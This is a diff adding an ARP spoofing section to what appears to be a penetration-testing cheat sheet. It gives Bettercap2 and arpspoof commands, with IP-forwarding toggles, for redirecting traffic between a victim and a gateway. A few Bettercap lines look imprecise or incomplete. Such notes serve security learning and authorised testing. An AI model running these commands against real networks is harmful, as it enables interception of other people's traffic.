@@ -199,3 +199,54 @@ python3 ./Pcredz -i eth0 -v
 ```
 
 # LAN Attacks
+
+## ARP spoofing
+
+Done by sending malicious **ARPResponses** saying that a target **IP** has the **MAC** of our device. Victems of the attack will then change their ARP table, and then contact our machine whenever it tries to access the target **IP**.
+
+### With Bettercap2
+
+Turn on arp spoofing
+```bash
+arp.spoof on
+```
+
+Setting no ipv4-redirect
+```bash
+arp.ban on
+```
+
+Setting up targets
+```bash
+arp.spoof.targets
+```
+
+Setting up a whitelist
+```bash
+arp.spoof whitelist
+```
+Spoofed local connections (by default only Victim <--> Gateway)
+```bash
+arp.spoof.internal
+```
+
+### With Arpspoof
+
+Turn on ipv4 forward(need root)
+```bash
+echo 1 > /proc/sys/net/ipv4/ip_forward
+```
+forward $ip1 --> $ip2
+```bash
+arpspoof -t $ip1 $ip2
+```
+forward $ip2 --> $ip1
+```bash
+arpspoof -t $ip2 $ip1
+```
+Turn off ipv4 forward(need root)
+```bash
+echo 0 > /proc/sys/net/ipv4/ip_forward
+```
+
+## MAC Flooding - CAM overflow
